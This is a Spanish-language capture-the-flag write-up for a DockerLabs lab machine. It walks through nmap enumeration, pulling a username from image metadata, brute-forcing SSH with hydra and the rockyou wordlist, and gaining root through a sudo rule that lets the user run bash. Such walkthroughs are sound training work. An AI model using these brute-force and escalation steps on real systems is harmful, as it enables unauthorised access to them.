# 🎯 Máquina: BorazuwarahCTF
**IP:** 172.17.0.2
**OS:** Linux (Docker)
**Dificultad:** Muy Facil

---
## 1. 🔍 Enumeración
```bash
nmap -p- -sC -sV 172.17.0.2

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 3d:fd:d7:c8:17:97:f5:12:b1:f5:11:7d:af:88:06:fe (ECDSA)
|_  256 43:b3:ba:a9:32:c9:01:43:ee:62:d0:11:12:1d:5d:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 26:7B:41:38:CD:69 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Ninguno se los servicios con vulnerabilidad conocida en searchsploit
Al ingresar a la pagina cargada en el puerto 80 podemos encontrar una imagen, el html no tiene más información por lo que descargamos la imagen:
```bash
 wget "http://172.17.0.2/imagen.jpeg"
--2026-09-07 01:17:33--  http://172.17.0.2/imagen.jpeg
Connecting to 172.17.0.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18667 (18K) [image/jpeg]
Saving to: ‘imagen.jpeg’

2026-09-07 01:17:33 (1.88 GB/s) - ‘imagen.jpeg’ saved [18667/18667]
```
Al examinarla con `exiftool` obtuvimos un usuario `borazuwarah`:
```bash
exiftool imagen.jpeg
ExifTool Version Number         : 13.55
File Name                       : imagen.jpeg
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2024:05:28 12:10:18-04:00
File Access Date/Time           : 2026:09:07 01:17:33-03:00
File Inode Change Date/Time     : 2026:09:07 01:17:33-03:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 12.76
Description                     : ---------- User: borazuwarah ----------
Title                           : ---------- Password:  ----------
Image Width                     : 455
Image Height                    : 455
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 455x455
Megapixels                      : 0.207
```
## 2. 🔓 Explotación (Foothold)
Con el usuario `borazuwarah` intentamos fuerza bruta en el puerto 22 SSH
```bash
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-07 01:23:47
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
```
Ya dentro del usuario vulnerable
## 3. 🚀 Escalada de Privilegios
Revisamos los comandos con permisos privilegiados del usuario:
```bash
sudo -l
Matching Defaults entries for borazuwarah on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User borazuwarah may run the following commands on dockerlabs:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```
Encontramos el comando bash, buscamos en GTFOBins un comando para explotar el binario con permisos de root:
```bash
borazuwarah@dockerlabs:~$ sudo bash
root@dockerlabs:/home/borazuwarah# whoami
root
```
Obteniendo el acceso al usuario root a través del binario comprometido.
## 4. 🚩 Banderas (Flags)
- **User:** N/A
- **Root**: N/A